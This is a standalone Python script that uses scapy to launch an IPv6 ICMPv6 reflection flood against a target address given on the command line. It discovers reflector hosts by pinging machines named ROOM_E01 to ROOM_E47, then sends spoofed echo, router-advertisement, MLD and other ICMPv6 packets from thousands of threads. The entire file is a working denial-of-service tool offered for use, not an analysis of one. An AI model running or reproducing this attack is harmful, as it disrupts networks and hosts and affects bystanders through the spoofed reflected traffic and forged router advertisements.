import os

try:
    from scapy.all import *
    from scapy.layers.inet6 import *
except ImportError:
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy"])
    # Try import again
    from scapy.all import *
    from scapy.layers.inet6 import *

import random, re, subprocess, sys, ipaddress
from concurrent.futures import ThreadPoolExecutor,wait
conf.checkIPaddr = False
conf.verb = 0


def extract_ipv6_from_ping(hostname):
    try:
        # Run ping command and capture output
        result = subprocess.run(["ping", hostname], capture_output=True, text=True, timeout=5)
        output = result.stdout

        # Check for unreachable hosts
        if "could not find host" in output.lower():
            return None

        # Extract the IPv6 address using regex (ignore % zone)
        match = re.search(r"\[([a-fA-F0-9:]+)(?:%\d+)?\]", output)
        if match:
            return match.group(1)  # Return IPv6 without zone ID
    except subprocess.TimeoutExpired:
        return None

def random_prefix(prefix_len_bits):
    # Generate a random 128-bit integer
    rand_int = random.getrandbits(128)
    
    # Mask to keep only prefix_len_bits bits, zero the rest
    mask = (1 << 128) - (1 << (128 - prefix_len_bits))
    prefix_int = rand_int & mask
    
    # Convert to IPv6 address
    prefix_addr = ipaddress.IPv6Address(prefix_int)
    
    return f'{prefix_addr}',prefix_len_bits

# Generate a random payload
def random_payload(size):
    return os.urandom(size)
# Get target IP
try:target_ip = sys.argv[1]
except:print("[+] Error: target_ip not provided as argument."); sys.exit(1)

length = int(sys.argv[2]) if len(sys.argv) > 2 else 84
if length > 65500:length = 65500
packet_count = int(sys.argv[3]) if len(sys.argv) > 3 else 250
icmp_type = sys.argv[4].upper() if len(sys.argv) > 4 else "ERQ"
thread_count = int(sys.argv[5]) if len(sys.argv) > 5 else 2500

import threading

all_ips = []
lock = threading.Lock()
def collect_ip(i):
    if i == 28:
        return
    ipv6 = extract_ipv6_from_ping(f"ROOM_E{i:02}")
    if ipv6:
        with lock:  # Ensure thread-safe append
            all_ips.append(ipv6)
threads = []
for i in range(1, 48):
    t = threading.Thread(target=collect_ip, args=(i,))
    t.start()
    threads.append(t)
for t in threads:t.join()

if len(all_ips) == 0:
 with open(os.path.join(os.getcwd(),'range_ipv6.txt'), 'r') as f:
    all_ips = [line.strip() for line in f if line.strip()]

# Get the max number of IPs to use from argv[6]
try:
    max_ips = int(sys.argv[6])
except (IndexError, ValueError):
    print("[+] Error: argv[6] must be an integer and provided (e.g., 1000)")
    sys.exit(1)

# Limit the list to the specified number, but not more than available
server_ip = all_ips[:min(max_ips, len(all_ips))]
random.shuffle(server_ip)

print(f"[+] Loaded {len(server_ip)} IPv6 reflectors from file (limit: {max_ips})")

def build_packet(dst_ip, length, target_ip, pkt_type="ERQ"):
    ip = random.choice((IPv6(src=target_ip, dst=dst_ip, hlim=255),IPv6(src=dst_ip,dst=target_ip,hlim=255)))
    if pkt_type == "ERQ":ip = ip / ICMPv6EchoRequest(id=random.randint(0, 65535),
                                     seq=random.randint(0, 65535),
                                     data=random_payload(length))
    elif pkt_type == "ERL":ip = ip / ICMPv6EchoReply(id=random.randint(0, 65535),
                                     seq=random.randint(0, 65535),
                                     data=random_payload(length))
    elif pkt_type == "NS":ip = ip / ICMPv6ND_NS(tgt=dst_ip)
    elif pkt_type == "RA":
        pkt = ip / ICMPv6ND_RA(curhoplimit=64, routerlifetime=1800,
                              reachabletime=0, retranstimer=0)
        while len(raw(pkt)) < length:
            prefix_ip, prefix_len = random_prefix(random.choice([32, 48, 64]))
            prefix = ICMPv6NDOptPrefixInfo(prefix=prefix_ip, prefixlen=prefix_len,
                                          validlifetime=2592000,
                                          preferredlifetime=604800, L=1, A=1)
            pkt = pkt / prefix
        ip = pkt
    elif pkt_type == 'MLD':ip = ip / ICMPv6MLQuery(maxresp=random.randint(1,65535), maddr="::")
    elif pkt_type == 'HAADR':ip = ip / ICMPv6HAADRequest()
    elif pkt_type == 'MRDA':ip = ip / ICMPv6MRD_Advertisement()
    elif pkt_type == 'MRDS':ip = ip / ICMPv6MRD_Solicitation()
    return ip

def reflection_flood_single(dst_ip, length, packet_count, target_ip, pkt_type="ER"):
    pkt = build_packet(dst_ip, length, target_ip, pkt_type)
    send(pkt, verbose=False, count=packet_count, inter=0)

def reflection_flood(dst_servers, length, packet_count, target_ip, pkt_type="ER", max_workers=100):
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.submit(reflection_flood_single, dst_ip, length, packet_count, target_ip, pkt_type) for dst_ip in dst_servers)

reflection_flood(server_ip,length,packet_count,target_ip,icmp_type,thread_count)

# Keep program running
while True:
    try:
        input("Press Ctrl+C to stop...\n")
    except KeyboardInterrupt:
        break
